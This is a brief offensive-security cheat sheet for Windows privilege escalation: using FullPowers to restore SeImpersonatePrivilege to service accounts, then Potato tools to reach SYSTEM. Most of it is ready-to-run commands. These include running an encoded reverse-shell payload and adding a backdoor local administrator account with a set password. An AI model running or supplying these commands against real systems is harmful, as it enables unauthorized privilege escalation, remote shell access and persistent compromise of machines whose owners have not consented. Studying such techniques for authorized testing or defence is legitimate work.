# FullPowers — Restore LOCAL SERVICE Token Privileges

Service accounts running as `NT AUTHORITY\LOCAL SERVICE` or `NT AUTHORITY\NETWORK SERVICE` may have had privileges stripped by the service manager. `FullPowers.exe` restores the full token including `SeImpersonatePrivilege`.

## Usage

```powershell
# Download and run:
.\FullPowers.exe

# Run a command directly with restored token:
.\FullPowers.exe -c "powershell -e <BASE64_REVSHELL>"

# Spawn cmd with full token:
.\FullPowers.exe -c cmd.exe -z
```

## After Token Restore — Potato Attack

With `SeImpersonatePrivilege` restored:

```powershell
# GodPotato (works on Windows Server 2012+, Windows 10/11):
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user admin P@ssw0rd /add && net localgroup administrators admin /add"

# PrintSpoofer:
.\PrintSpoofer.exe -c cmd.exe -i

# SweetPotato:
.\SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c <CMD>"
```

## Notes

- FullPowers spawns a child process via a COM trigger that runs with the full service token
- Requires the account to be LOCAL SERVICE or NETWORK SERVICE (not arbitrary low-priv users)
- Source: https://github.com/itm4n/FullPowers
